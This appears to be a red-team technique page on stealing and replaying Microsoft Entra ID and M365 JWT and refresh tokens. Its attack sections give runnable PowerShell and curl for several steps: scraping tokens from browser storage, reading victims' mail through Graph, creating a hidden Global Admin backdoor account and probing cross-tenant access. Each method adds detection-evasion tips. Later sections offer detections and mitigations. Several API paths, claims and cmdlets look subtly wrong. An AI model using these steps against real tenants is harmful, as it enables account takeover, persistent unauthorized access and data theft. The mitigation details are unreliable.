# [SAAS-API-005]: JSON Web Token (JWT) Manipulation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | SAAS-API-005 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | M365/Entra ID |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All versions (M365, Entra ID, Azure) |
| **Patched In** | No patch available; mitigation through token binding required |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. Executive Summary

JWT (JSON Web Token) manipulation attacks involve intercepting, forging, or modifying JSON Web Tokens to bypass authentication and authorization controls in SaaS and cloud environments. JWTs are cryptographic tokens that serve as proof of authentication and contain claims about the user's identity and permissions. Attackers who gain access to a valid JWT (through credential theft, phishing, or token interception) can use it to impersonate users, escalate privileges, or move laterally across cloud services without needing the original credentials or MFA factors.

**Attack Surface:** JWT tokens issued by Entra ID (Microsoft identity platform), OAuth 2.0 authorization servers, and SAML token endpoints are the primary attack surface. Tokens can be stolen from browser memory, intercepted during transit, or obtained through device compromise.

**Business Impact:** **Complete account takeover and cross-tenant compromise possible**. An attacker with a valid JWT can access email, SharePoint, OneDrive, Teams, and other M365 services. If the token is scoped with administrative permissions, the attacker can create backdoors, reset passwords, modify policies, or exfiltrate sensitive data at scale.

**Technical Context:** JWT attacks typically take **seconds to minutes** to execute after token acquisition. Detection is **moderate to low** depending on logging configuration. The most common indicators include unusual token usage patterns (different geographic regions, impossible travel, unusual scopes), token replay, and cross-service API calls without user interaction.

### Operational Risk

- **Execution Risk:** High - Once a token is stolen, exploitation is trivial and leaves minimal forensic evidence if logging is not enabled.
- **Stealth:** High - Token-based attacks blend in with legitimate authentication traffic and bypass many traditional perimeter controls.
- **Reversibility:** No - Token-based access is persistent until the token expires or is revoked. Attackers can use stolen refresh tokens to obtain new access tokens indefinitely.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1 | Ensure Multi-Factor Authentication (MFA) is enforced for all users with administrative access |
| **DISA STIG** | AC-3 | Enforce token binding and limit token lifetime to 1 hour or less |
| **CISA SCuBA** | App Security - Token Binding | Require token binding and implement token validation |
| **NIST 800-53** | AC-3, AT-2, SC-7 | Access Enforcement; User Security Awareness Training; Boundary Protection |
| **GDPR** | Art. 32 | Security of Processing - implement cryptographic binding and monitoring |
| **DORA** | Art. 9 | Protection and Prevention - APIs must validate token signatures and scope |
| **NIS2** | Art. 21 | Cyber Risk Management - cryptographic binding of tokens to devices |
| **ISO 27001** | A.9.2.3, A.13.1.1 | Management of Privileged Access Rights; Authentication Controls |
| **ISO 27005** | Risk Scenario | Compromise of authentication tokens or credentials |

---

## 2. Technical Prerequisites

- **Required Privileges:** Ability to intercept network traffic OR access to an endpoint with stored JWT tokens OR access to browser memory/cache.
- **Required Access:** Network visibility or endpoint compromise; OAuth 2.0 endpoints accessible (typically publicly available).

**Supported Versions:**
- **M365:** All versions (Office 365, Microsoft 365)
- **Entra ID:** All versions (Azure AD, Entra ID)
- **Azure:** All subscription types
- **PowerShell:** Version 5.0+
- **Other Requirements:** JWT decoding tools (base64), browser developer tools, or traffic interception capability (Burp Suite, Fiddler, etc.)

**Tools:**
- [jwt.io](https://jwt.io) - JWT decoding and analysis
- [ROADtools](https://github.com/dirkjanm/ROADtools) - Azure/Entra ID token manipulation
- [TokenTactics](https://github.com/rvrsh3ll/TokenTactics) - PowerShell toolkit for token extraction and manipulation
- [AADInternals](https://aadinternals.com/) - PowerShell module for Azure/Entra ID operations
- [Burp Suite](https://portswigger.net/burp) - Traffic interception and token inspection
- [curl](https://curl.se/) - Command-line tool for crafting HTTP requests with tokens

---

## 3. Environmental Reconnaissance

### Step 1: Identify JWT Token Storage and Transmission

**Objective:** Determine where JWT tokens are stored in the target environment and how they are transmitted.

**Method 1: Browser Developer Tools**

Open your browser's Developer Tools (F12):

1. Navigate to **Network** tab
2. Perform a login action to an M365 service (portal.azure.com, outlook.office.com, etc.)
3. Look for requests with `Authorization: Bearer` header
4. Each token request will contain a JWT token in the format: `eyJhbGciOiJSUzI1NiIsImtpZCI6...`

**What to Look For:**
- Tokens in the `Authorization` header (standard OAuth 2.0)
- Tokens in cookies (less common, but possible in legacy integrations)
- Refresh tokens stored in browser localStorage or sessionStorage
- Token endpoints: `https://login.microsoftonline.com/{tenant-id}/oauth2/v2.0/token`

**Expected Output:**
```
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjFjZDRjMzQ3YzFlNDAxNjAwYTljMjJlOTYwZWY2ZjFjMzI1OTdjZTEiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20iLCJpc3MiOiJodHRwczovL3N0cy5taWNyb3NvZnQuY29tL3sVlU2FzcC9mZDA2YmQ0Ny1hZmE2LTQwNDgtOTM2MS1hNjE1ZDMwMGQwMzEvIiwiaWF0IjoxNjM0NzU2MjAwLCJuYmYiOjE2MzQ3NTYyMDAsImV4cCI6MTYzNDc1OTgwMH0...
```

**Step 2: Extract and Decode JWT Token**

**Objective:** Extract the JWT token and decode its payload to understand its structure and claims.

**Method 1: Using jwt.io**

1. Go to https://jwt.io
2. Paste the extracted JWT token in the "Encoded" section
3. The "Decoded" section will show:
   - **Header:** Token type (JWT) and signing algorithm (RS256, etc.)
   - **Payload:** User claims (user_id, email, roles, scopes, etc.)
   - **Signature:** Cryptographic verification (base64-encoded)

**Expected Payload Structure:**
```json
{
  "aud": "https://graph.microsoft.com",
  "iss": "https://sts.microsoft.com/{tenant-id}/",
  "iat": 1634756200,
  "nbf": 1634756200,
  "exp": 1634759800,
  "aio": "AVQBq/8TAAAARVBqbVrU2JgB2H1L8W1x2H...",
  "appid": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
  "appidacr": "0",
  "idp": "https://sts.microsoft.com/{tenant-id}/",
  "oid": "1234567890-abcdef",
  "rh": "0.AVcA4-1-_xxxxxxxxx",
  "scp": "User.Read Calendars.Read Mail.Read Mail.Send",
  "sub": "1234567890-abcdef",
  "tid": "tenant-id-here",
  "unique_name": "user@contoso.onmicrosoft.com",
  "uti": "abcdefghijklmnop",
  "ver": "1.0"
}
```

**Key Claims to Understand:**
- **aud (Audience):** The API endpoint the token is valid for (e.g., graph.microsoft.com, outlook.office365.com)
- **iss (Issuer):** The Entra ID instance that issued the token
- **exp (Expiration):** Unix timestamp of token expiration (typically 1 hour)
- **scp (Scopes):** Permissions granted to the token (e.g., User.Read, Mail.Send)
- **oid (Object ID):** User's object ID in Entra ID
- **tid (Tenant ID):** The Azure tenant the user belongs to
- **unique_name:** User's email or UPN

**Step 3: Identify Token Refresh Endpoints**

**Objective:** Find the token refresh endpoint to understand how new tokens are issued.

**Command (PowerShell):**
```powershell
# Check if refresh token is available in browser cache
Get-Item -Path "HKCU:\Software\Microsoft\AuthenticationsCredentials\*" -ErrorAction SilentlyContinue | Get-ItemProperty

# Alternatively, check Local Storage for Entra ID tokens (requires browser automation or manual inspection)
```

**Expected Output:**
- Refresh tokens are typically stored in Windows Credential Manager or browser local storage
- They have the structure of JWTs but with longer expiration times (14 days or more)

---

## 4. Detailed Execution Methods

### METHOD 1: JWT Token Theft via Browser Interception

**Supported Versions:** All M365 and Entra ID versions

#### Step 1: Intercept Token in Transit

**Objective:** Capture a valid JWT token from a user's browser session.

**Prerequisites:**
- Network access to the target user's traffic (same network, MITM capable, or compromised endpoint)
- Ability to install traffic interception proxy (Burp Suite, Fiddler)

**Method A: Using Burp Suite**

1. Install Burp Suite Community Edition on a machine with network visibility
2. Configure your browser proxy to route through Burp Suite (Proxy Settings → 127.0.0.1:8080)
3. Navigate to portal.azure.com or any M365 service
4. Perform authentication
5. In Burp Suite, go to **Proxy → HTTP History**
6. Filter for requests to `login.microsoftonline.com` or `graph.microsoft.com`
7. Look for the `Authorization: Bearer` header
8. Copy the entire JWT token (eyJ... portion only, exclude "Bearer " prefix)

**Example Captured Request:**
```
POST /oauth2/v2.0/token HTTP/1.1
Host: login.microsoftonline.com
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token&refresh_token=0.AvAAO-Z...&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://graph.microsoft.com/.default
```

**OpSec & Evasion:**
- Use a proxy that doesn't log traffic (configure Burp to disable history)
- Ensure SSL/TLS interception is configured to avoid alerts
- Use a device on a separate network segment to avoid raising network monitoring alerts
- Consider using a VPN to obscure your traffic origin

**Detection Likelihood:** Low (network-level interception) to High (if endpoint monitoring is enabled)

**Troubleshooting:**
- **Error:** "Certificate validation failed"
  - **Cause:** The target browser hasn't trusted the Burp Suite CA certificate
  - **Fix:** Import Burp Suite CA certificate into the browser's certificate store
  - **Manual Steps (Windows):** Settings → Privacy & Security → Security → Manage certificates → Import Burp CA

#### Step 2: Use Stolen Token to Access M365 APIs

**Objective:** Use the stolen JWT token to authenticate API requests and access M365 resources.

**Version Note:** Same approach works for all M365 and Entra ID versions

**Method A: Using curl with Microsoft Graph API**

```bash
#!/bin/bash

# Variables
JWT_TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6IjFjZDRjMzQ3YzFlNDAxNjAwYTljMjJlOTYwZWY2ZjFjMzI1OTdjZTEiLCJ0eXAiOiJKV1QifQ..."
GRAPH_ENDPOINT="https://graph.microsoft.com/v1.0"

# Make API request to list user's email
curl -X GET "$GRAPH_ENDPOINT/me/messages" \
  -H "Authorization: Bearer $JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -v
```

**Expected Output (Success):**
```json
{
  "value": [
    {
      "id": "AAMkADU2MGZjNDU3LTg2ZmYtNDAxYy04ZTEwLWUyY2U5Yzc4ZmI3MQBGAAAAAAChM4...",
      "subject": "Meeting Tomorrow at 2PM",
      "from": {
        "emailAddress": {
          "address": "boss@contoso.com",
          "name": "Your Manager"
        }
      },
      "bodyPreview": "Hi, just confirming our meeting tomorrow..."
    }
  ]
}
```

**What This Means:**
- The token is valid and scoped for `Mail.Read`
- You can now read all emails accessible to the compromised user
- If token has `Mail.Send` scope, you can also send emails on behalf of the user

**Method B: Using PowerShell TokenTactics**

```powershell
# Install TokenTactics (if not already installed)
# git clone https://github.com/rvrsh3ll/TokenTactics.git
# cd TokenTactics

# Import the module
Import-Module .\TokenTactics.psd1

# Use stolen refresh token to get new access tokens
Invoke-RefreshToGraphToken -domain victim-org.com -refreshToken $RefreshToken

# Or use stolen access token directly
$AccessToken = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjFjZDRjMzQ3YzFlNDAxNjAwYTljMjJlOTYwZWY2ZjFjMzI1OTdjZTEiLCJ0eXAiOiJKV1QifQ..."

# Make Graph API call
$Headers = @{"Authorization" = "Bearer $AccessToken"}
$Uri = "https://graph.microsoft.com/v1.0/me/messages"
$Response = Invoke-RestMethod -Uri $Uri -Headers $Headers -Method Get
$Response.value | Select-Object subject, from
```

**Expected Output:**
```
subject                               from
-------                               ----
Meeting Tomorrow at 2PM               @{emailAddress=@{address=boss@contoso.com; name=Your Manager}}
Project Status Update                 @{emailAddress=@{address=colleague@contoso.com; name=Colleague Name}}
```

**OpSec & Evasion:**
- Use a managed identity or service principal token if possible to avoid user-level detection
- Rotate between different access scopes to avoid triggering anomaly detection
- Use Graph API endpoints sparingly; excessive API calls trigger rate limiting and alerts
- Consider using the deprecated AAD Graph endpoint (`graph.windows.net`) instead of MS Graph for stealth
- Ensure requests include proper User-Agent headers and referer fields to appear legitimate

**Detection Likelihood:** Medium (if Graph API logging is enabled and monitored)

#### Step 3: Escalate to Administrative Access

**Objective:** Use token to create a backdoor account or escalate privileges.

**Version Note:** This requires the token to have Directory.Admin permissions (typically Global Admin)

**Command (PowerShell):**
```powershell
# Create a new user account with Global Admin role (requires Directory.Admin scope)
$Headers = @{"Authorization" = "Bearer $AccessToken"}

# Step 1: Create new user
$UserBody = @{
    "accountEnabled" = $true
    "displayName" = "IT Support - Backup"
    "mailNickname" = "itsupport.backup"
    "userPrincipalName" = "itsupport.backup@contoso.com"
    "passwordProfile" = @{
        "forceChangePasswordNextSignIn" = $false
        "password" = "X#K@$L9*v2pQ&wR4!"
    }
} | ConvertTo-Json

$CreateUserUri = "https://graph.microsoft.com/v1.0/users"
$NewUser = Invoke-RestMethod -Uri $CreateUserUri -Headers $Headers -Method Post -Body $UserBody -ContentType "application/json"
$NewUserId = $NewUser.id

# Step 2: Add to Global Admin role
$RoleBody = @{
    "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$NewUserId"
} | ConvertTo-Json

$AddToRoleUri = "https://graph.microsoft.com/v1.0/directoryRoles/roleDefinitions/62e90394-69f5-4237-9190-012177145e10/members/`$ref"
Invoke-RestMethod -Uri $AddToRoleUri -Headers $Headers -Method Post -Body $RoleBody -ContentType "application/json"

Write-Host "Created Global Admin backdoor account: itsupport.backup@contoso.com"
```

**Expected Output:**
```
Created Global Admin backdoor account: itsupport.backup@contoso.com
```

**What This Means:**
- A new user account with Global Admin privileges has been created
- The attacker can now authenticate as this account and maintain persistent access
- This backdoor is difficult to detect without advanced auditing

---

### METHOD 2: JWT Token Refresh Token Abuse

**Supported Versions:** All M365 and Entra ID versions

#### Step 1: Obtain Refresh Token

**Objective:** Extract or steal a refresh token from the victim's environment.

**Method A: From Browser Storage (Windows)**

Refresh tokens are often stored in Windows Credential Manager or browser local storage.

**Command (PowerShell):**
```powershell
# Check Windows Credential Manager for stored tokens
cmdkey /list

# Extract credential (if visible)
$cred = Get-StoredCredential -Target "MicrosoftAccount:user@contoso.com"
$cred.Password
```

**Method B: From Browser Local Storage**

```powershell
# For Chromium-based browsers, check Local Storage
$LocalStoragePath = "$env:APPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
Get-ChildItem -Path $LocalStoragePath -Filter "*.ldb" | ForEach-Object {
    Select-String -Pattern "refresh_token" -Path $_.FullName -Raw | Write-Host
}
```

**Expected Output:**
```
refresh_token:eyJhbGciOiJSUzI1NiIsImtpZCI6Imdzc0xxxxxxxxxxxxxxx...
```

#### Step 2: Exchange Refresh Token for New Access Token

**Objective:** Use the refresh token to obtain a new access token.

**Command (PowerShell):**
```powershell
# Variables
$TenantId = "12345678-1234-1234-1234-123456789012"
$RefreshToken = "0.AvAAO-Z..."
$ClientId = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Microsoft Graph default client ID

# Exchange refresh token for new access token
$TokenUri = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"

$TokenBody = @{
    grant_type    = "refresh_token"
    refresh_token = $RefreshToken
    client_id     = $ClientId
    scope         = "https://graph.microsoft.com/.default"
}

$Response = Invoke-RestMethod -Uri $TokenUri -Method Post -Body $TokenBody
$NewAccessToken = $Response.access_token
$NewRefreshToken = $Response.refresh_token

Write-Host "New Access Token: $NewAccessToken"
Write-Host "New Refresh Token: $NewRefreshToken"
```

**Expected Output:**
```
New Access Token: eyJhbGciOiJSUzI1NiIsImtpZCI6IjFjZDRjMzQ3YzFlNDAxNjAwYTljMjJlOTYwZWY2ZjFjMzI1OTdjZTEi...
New Refresh Token: 0.AvAAO-Z2.xxxxxxxxxxxxxxxxxx...
```

**What This Means:**
- You now have a new valid access token scoped to MS Graph
- The new refresh token can be used to obtain additional tokens in the future
- This process can be repeated indefinitely until the refresh token is revoked

**OpSec & Evasion:**
- Refresh tokens should be exchanged from the victim's network segment to avoid anomaly detection
- Use the legitimate Microsoft client ID to avoid triggering alerts
- Space out token refresh requests to avoid rate limiting

---

### METHOD 3: Cross-Tenant JWT Manipulation

**Supported Versions:** All M365 and Entra ID versions (affects cross-tenant scenarios)

#### Step 1: Extract Tenant-Agnostic Tokens

**Objective:** Identify and exploit tokens that can be used across multiple tenants.

**Version Note:** Some Microsoft services issue tokens that are not strictly tenant-bound, allowing cross-tenant access

**Command (PowerShell):**
```powershell
# Decode JWT to identify tenant scope
function Decode-JWT {
    param($token)
    
    # Remove "Bearer " prefix if present
    $token = $token -replace "^Bearer ", ""
    
    # Split JWT into parts
    $parts = $token.Split('.')
    
    # Decode header
    $header = [System.Convert]::FromBase64String(($parts[0] + "==").Replace('-', '+').Replace('_', '/'))
    $headerJson = [System.Text.Encoding]::UTF8.GetString($header)
    
    # Decode payload
    $payload = [System.Convert]::FromBase64String(($parts[1] + "==").Replace('-', '+').Replace('_', '/'))
    $payloadJson = [System.Text.Encoding]::UTF8.GetString($payload)
    
    return @{
        header  = $headerJson | ConvertFrom-Json
        payload = $payloadJson | ConvertFrom-Json
    }
}

# Analyze token
$DecodedToken = Decode-JWT -token $AccessToken
$DecodedToken.payload | Select-Object tid, aud, scp
```

**Expected Output:**
```
tid aud                                    scp
--- ---                                    ---
    https://graph.microsoft.com            User.Read Calendars.Read
```

**Analyzing Cross-Tenant Tokens:**
- If `tid` (tenant ID) is missing or generalized, the token may be valid across tenants
- If `aud` includes multiple resources, the token has broader scope

#### Step 2: Attempt Cross-Tenant Access

**Objective:** Use the token to access resources in different tenant than the token's origin.

**Command (Bash with curl):**
```bash
#!/bin/bash

# Extract token and attempt cross-tenant access
ACCESS_TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6IjFj..."

# Attempt to list users (cross-tenant)
for TENANT_ID in "tenant1-id" "tenant2-id" "tenant3-id"; do
    echo "Attempting access to tenant: $TENANT_ID"
    
    curl -s -X GET "https://graph.microsoft.com/v1.0/tenantRelationships/managedTenants/tenants" \
        -H "Authorization: Bearer $ACCESS_TOKEN" \
        -H "X-Tenant-ID: $TENANT_ID" \
        -w "\nHTTP Status: %{http_code}\n"
done
```

**Expected Output (If Vulnerable):**
```
HTTP Status: 200
{
  "value": [
    {
      "id": "12345678-1234-1234-1234-123456789012",
      "displayName": "Target Tenant",
      ...
    }
  ]
}
```

**OpSec & Evasion:**
- Cross-tenant attacks are increasingly logged and flagged
- Use legitimate service principals that have explicit cross-tenant delegation
- Avoid attempting access to known high-security tenants

---

## 5. Detection & Incident Response

### Indicators of Compromise (IOCs)

**Token-Related IOCs:**
- Unusual token usage patterns (impossible travel - tokens used from different geographic regions within seconds)
- Tokens with unusually long lifetime or no expiration
- Tokens with excessive scopes (e.g., `/.default` scope on non-privileged applications)
- Refresh tokens being exchanged too frequently

**API Activity IOCs:**
- Bulk email downloads without user interaction
- Mass user creation or admin role assignment via Graph API
- SharePoint or OneDrive folder enumerations from non-standard clients
- Calls to sensitive APIs (e.g., `/directoryRoles/roleDefinitions`) from unexpected locations

**Forensic Artifacts**

**Cloud Artifacts:**
- **SigninLogs:** Azure AD audit logs showing token-based sign-ins without interactive authentication
- **AuditLogs:** Operations log showing API calls with unusual scopes or from service principals
- **Microsoft Sentinel:** AADSignInEventsBeta table contains token usage telemetry

**Example Forensic Query (KQL):**
```kusto
SigninLogs
| where AuthenticationDetails has "token"
| where ClientAppUsed == "Browser" and InteractiveSignInCount == 0
| where GeoLocation != "United States"  // Adjust to your organization
| project TimeGenerated, UserPrincipalName, ClientAppUsed, GeoLocation, CorrelationId
```

---

## 6. Defensive Mitigations

### Priority 1: CRITICAL

- **Implement Token Binding:** Cryptographically bind tokens to devices using Azure AD token protection. This prevents tokens stolen from one device from being used on another device.

  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Token Protection Policy`
  4. **Assignments:**
     - Users: **All users**
     - Cloud apps: **All cloud apps**
  5. **Conditions:**
     - Client apps: **Modern authentication clients**
  6. **Access controls → Grant:**
     - Select **Require device to be marked as compliant**
     - Select **Require approved client app**
  7. Enable policy: **On**
  8. Click **Create**

  **Alternative: Using PowerShell (Entra ID Premium P1+):**
  ```powershell
  # Enable token protection in Conditional Access
  Connect-MgGraph -Scopes "Policy.Read.All", "Policy.ReadWrite.ConditionalAccess"
  
  $policy = @{
      displayName = "Token Protection Policy"
      state       = "enabledForReportingButNotEnforced"
      conditions  = @{
          clientAppTypes = @("modern", "legacy")
      }
      grantControls = @{
          operator = "AND"
          builtInControls = @("deviceCompliance", "approvedClientApp")
      }
  }
  
  New-MgIdentityConditionalAccessPolicy -BodyParameter $policy
  ```

- **Enforce Multi-Factor Authentication (MFA):** Require MFA for all users, especially administrators. This prevents token theft from being the only attack vector.

  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Users** → **Multi-Factor Authentication**
  2. Select users → Click **Enable**
  3. Users must complete MFA setup on next login

- **Limit Token Lifetime:** Set access token lifetime to 1 hour or less. Reduce refresh token lifetime to 14 days.

  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Applications** → **App registrations**
  2. Click on your application
  3. Click **Token configuration**
  4. Click **Add optional claim**
  5. Select **Access** → Add **exp_in_minutes** (set to 60)
  6. Click **Save**

  **PowerShell:**
  ```powershell
  Set-MgServicePrincipal -Id $ServicePrincipalId `
    -TokenEncryptionKeyId $KeyId
  ```

### Priority 2: HIGH

- **Monitor Token Usage:** Log all token exchanges and usage via Azure AD Identity Protection and Microsoft Sentinel.

  **KQL Detection Rule:**
  ```kusto
  AADServicePrincipalSignInLogs
  | where RiskLevel == "medium" or RiskLevel == "high"
  | where TokenIssuerType == "ADFSIndirect" or TokenIssuerType == "AzureAD"
  | project TimeGenerated, AppDisplayName, UserId, RiskLevel, RiskDetail
  ```

- **Disable Legacy Authentication:** Disable Basic Authentication and legacy protocols (IMAP, SMTP, POP3) that don't support modern token-based authentication.

  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Create policy: "Block Legacy Authentication"
  3. **Conditions → Client apps:** Select "Exchange ActiveSync clients" and "Other clients"
  4. **Access controls → Block**

- **Review Active Sessions:** Regularly review and revoke active sessions from Entra ID portal.

  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Users**
  2. Select user → **Active sessions**
  3. Review and revoke suspicious sessions

### Access Control & Policy Hardening

- **Principle of Least Privilege:** Assign minimal scopes and permissions to tokens. Use resource-specific consent instead of broad `.default` scope.

  **Example - Limiting OAuth Scopes:**
  ```json
  // Instead of:
  scope: "https://graph.microsoft.com/.default"
  
  // Use specific scopes:
  scope: "https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read"
  ```

- **Service Principal Restrictions:** Limit service principal access to specific resources using conditional access policies.

  **Manual Steps:**
  1. Create a Conditional Access policy targeting service principals
  2. Under **Cloud apps:** Select specific APIs (Graph, Exchange, etc.)
  3. Under **Access controls:** Require device compliance or other conditions

### Validation Command (Verify Mitigation)

```powershell
# Verify token binding is enabled
Get-MgIdentityConditionalAccessPolicy -Filter "displayName eq 'Token Protection Policy'" | Select-Object DisplayName, State

# Verify token lifetime is configured
Get-MgApplication -Filter "displayName eq 'YourAppName'" | Select-Object DisplayName, `
  @{Label="TokenLifetime"; Expression={ $_.TokenIssuancePolicy }}

# Verify MFA is required for users
Get-MgUser -Filter "userType eq 'Member'" | Select-Object UserPrincipalName, `
  @{Label="MFARequired"; Expression={ $_.StrongAuthenticationRequirements }}
```

**Expected Output (If Secure):**
```
DisplayName                 State
-----------                 -----
Token Protection Policy     enabledForReportingButNotEnforced

UserPrincipalName           MFARequired
-----------------           -----------
user@contoso.com            True
admin@contoso.com           True
```

---

## 7. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker tricks user into authorizing device code, obtaining refresh token |
| **2** | **Credential Access** | [CA-TOKEN-005] OAuth Access Token Interception | Token stolen from browser or network traffic |
| **3** | **Lateral Movement** | **[SAAS-API-005]** | **JWT token used to access multiple M365 services** |
| **4** | **Privilege Escalation** | [PE-ACCTMGMT-014] Global Administrator Backdoor | New admin account created using token access |
| **5** | **Persistence** | [PERSIST-CLOUD-002] OAuth Application Persistence | Malicious app registered with delegated permissions |
| **6** | **Exfiltration** | [COLL-CLOUD-001] Cloud Data Exfiltration | Emails, SharePoint files, Teams messages stolen via Graph API |

---

## 8. Real-World Examples

### Example 1: Volexity - OAuth Phishing Campaign (2023)

- **Target:** Enterprise M365 tenants
- **Technique Status:** ACTIVE (OAuth phishing → token theft → lateral movement)
- **Impact:** Attackers obtained refresh tokens via OAuth phishing, exchanged them for access tokens, and accessed email and SharePoint without MFA prompts using ROADtools
- **Reference:** [Elastic Security Labs - Entra ID OAuth Phishing Detection](https://www.elastic.co/security-labs/entra-id-oauth-phishing-detection)

### Example 2: APT29 - SAML Token Forging (2021-2022)

- **Target:** U.S. Treasury, Commerce Department
- **Technique Status:** ACTIVE (ADFS compromise → SAML token forging → cross-tenant access)
- **Impact:** APT29 forged SAML tokens to impersonate users and bypass MFA, accessing cloud applications for months
- **Reference:** CISA Advisory on SolarWinds Compromise

### Example 3: Token Manipulation via Refresh Token Theft (2024)

- **Target:** Small business Microsoft 365 environment
- **Technique Status:** ACTIVE
- **Impact:** Attacker stole refresh token from cached credentials, obtained new access tokens, and created backdoor admin account
- **Reference:** Microsoft Threat Intelligence blogs and incident reports

---

## 9. References & Tools

- [MITRE ATT&CK - T1550 Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/)
- [Microsoft - Secure Your Azure AD](https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/secure-azure-ad)
- [JWT.io - JWT Debugger](https://jwt.io)
- [ROADtools - GitHub](https://github.com/dirkjanm/ROADtools)
- [TokenTactics - GitHub](https://github.com/rvrsh3ll/TokenTactics)
- [OWASP - OAuth 2.0 Security Best Practices](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)

---
